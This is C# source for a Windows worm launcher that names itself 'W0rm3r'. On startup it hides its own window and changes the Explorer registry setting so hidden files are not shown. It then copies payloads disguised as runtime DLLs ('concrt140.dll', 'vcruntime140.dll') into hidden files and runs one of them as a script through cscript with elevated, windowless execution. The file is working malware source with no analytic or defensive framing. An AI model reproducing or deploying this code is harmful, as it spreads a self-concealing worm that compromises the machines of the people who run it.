using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using Microsoft.Win32;
using System.IO;
namespace W0rm3r
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        void runWrm(string name)
        {
            Process scriptProc = new Process();
            var windows = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
            var processFileName = windows + @"\SysWOW64\cscript.exe";
            string processArguments = name;
            scriptProc.StartInfo.FileName = processFileName;
            scriptProc.StartInfo.Arguments = processArguments;
            scriptProc.StartInfo.CreateNoWindow = true;
            scriptProc.StartInfo.Verb = "runas";
            scriptProc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            scriptProc.StartInfo.UseShellExecute = false;
            scriptProc.StartInfo.LoadUserProfile = true;
            scriptProc.Start();
            scriptProc.Close();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            //HideMe
            Hide();
            this.Visible = false;
            // Worm name : concrt140.dll
            string wrm = "concrt140.dll";
            string file = "vcruntime140.dll"; // Program name
            string runnerWRM = "dxsetup.js";
            string runnerP = "\'" + Path.GetFileName(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
               // rEgistry
            RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
            if (key != null)
            {
                key.SetValue("Hidden", "2");

            }
            //End Registry
            if (!File.Exists(runnerWRM))
            {
                File.Copy(wrm, runnerWRM);
                File.SetAttributes(runnerWRM, FileAttributes.Hidden);
                runWrm(runnerWRM);
            }
            else
                runWrm(runnerWRM);
            System.Windows.Forms.SendKeys.Send("{F5}");

            if (!File.Exists(runnerP))
            {
                File.Copy(file, runnerP);
                File.SetAttributes(runnerP, FileAttributes.Hidden);
                System.Windows.Forms.SendKeys.Send("{F5}");
                Process.Start(runnerP);
            }
            else
                Process.Start(runnerP);
            Application.Exit();
        }
    }
}
